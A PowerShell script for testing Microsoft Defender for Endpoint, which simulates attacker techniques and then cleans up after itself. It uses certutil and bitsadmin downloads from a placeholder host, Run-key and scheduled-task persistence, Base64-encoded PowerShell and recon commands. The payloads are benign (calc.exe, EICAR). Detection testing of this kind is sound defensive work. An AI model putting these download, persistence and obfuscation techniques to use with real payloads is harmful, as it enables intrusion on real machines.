# =====================
# MDE Test Simulation Script with Logging & Cleanup
# =======================

$cleanupDelayMinutes = 5  # Tiempo de espera antes de limpiar (en minutos)
$logFile = "$env:USERPROFILE\Desktop\MDE_Test_Log_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

Function Log {
    param ([string]$message)
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $entry = "$timestamp`t$message"
    Write-Host $message
    Add-Content -Path $logFile -Value $entry
}

Log "=== Starting Microsoft Defender for Endpoint test simulation ==="

# 1. EICAR Test File Download
Log "[*] Downloading EICAR test file..."
try {
    Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$env:USERPROFILE\Desktop\eicar.com" -ErrorAction Stop
    Log "[+] EICAR file downloaded successfully."
} catch {
    Log "[!] Could not download EICAR file. It may have been blocked by Defender."
}

Start-Sleep -Seconds 2

# 2. Certutil simulated download
Log "[*] Using certutil to simulate download..."
certutil.exe -urlcache -split -f "https://example.com/fakepayload.exe" "$env:TEMP\fakepayload.exe" | Out-Null
Log "[+] Certutil download simulation completed."

Start-Sleep -Seconds 2

# 3. Registry Persistence
Log "[*] Creating registry persistence..."
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MDETest" -Value "calc.exe"
    Log "[+] Registry Run key created."
} catch {
    Log "[!] Failed to create registry key."
}

Start-Sleep -Seconds 2

# 4. Scheduled Task
Log "[*] Creating scheduled task for persistence..."
schtasks /create /tn "MDETestTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 15 /f | Out-Null
Log "[+] Scheduled task created."

Start-Sleep -Seconds 2

# 5. Obfuscated PowerShell
Log "[*] Executing obfuscated PowerShell (Base64)..."
powershell.exe -EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQA1AA==  # Start-Sleep 15
Log "[+] Obfuscated PowerShell executed."

Start-Sleep -Seconds 2

# 6. Reconnaissance commands
Log "[*] Running reconnaissance commands..."
whoami /priv | Out-Null
ipconfig /all | Out-Null
net user | Out-Null
Log "[+] Reconnaissance commands executed."

Start-Sleep -Seconds 2

# 7. BITSAdmin simulation
Log "[*] Using bitsadmin to simulate download..."
bitsadmin /transfer "job1" /download /priority normal https://example.com/file.exe C:\Users\Public\file.exe | Out-Null
Log "[+] BITSAdmin download simulated."

Start-Sleep -Seconds 2

# 8. Payload simulation
Log "[*] Simulating payload execution (calc.exe)..."
Start-Process calc.exe
Log "[+] calc.exe launched."

# Wait before cleanup
Log "[*] Waiting $cleanupDelayMinutes minutes before cleanup..."
Start-Sleep -Seconds ($cleanupDelayMinutes * 60)

# =======================
# Cleanup Section
# =======================
Log "[*] Starting cleanup process..."

# Remove registry key
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MDETest" -ErrorAction SilentlyContinue
    Log "[+] Registry Run key removed."
} catch {
    Log "[!] Failed to remove registry key."
}

# Delete scheduled task
try {
    schtasks /delete /tn "MDETestTask" /f | Out-Null
    Log "[+] Scheduled task deleted."
} catch {
    Log "[!] Failed to delete scheduled task."
}

# Delete test files
$testFiles = @(
    "$env:USERPROFILE\Desktop\eicar.com",
    "$env:TEMP\fakepayload.exe",
    "C:\Users\Public\file.exe"
)

foreach ($file in $testFiles) {
    if (Test-Path $file) {
        try {
            Remove-Item $file -Force -ErrorAction Stop
            Log "[+] Deleted $file"
        } catch {
            Log "[!] Failed to delete $file"
        }
    } else {
        Log "[*] File not found for deletion: $file"
    }
}

Log "[✓] Cleanup complete. Test simulation finished successfully."
Log "=== End of Log ==="
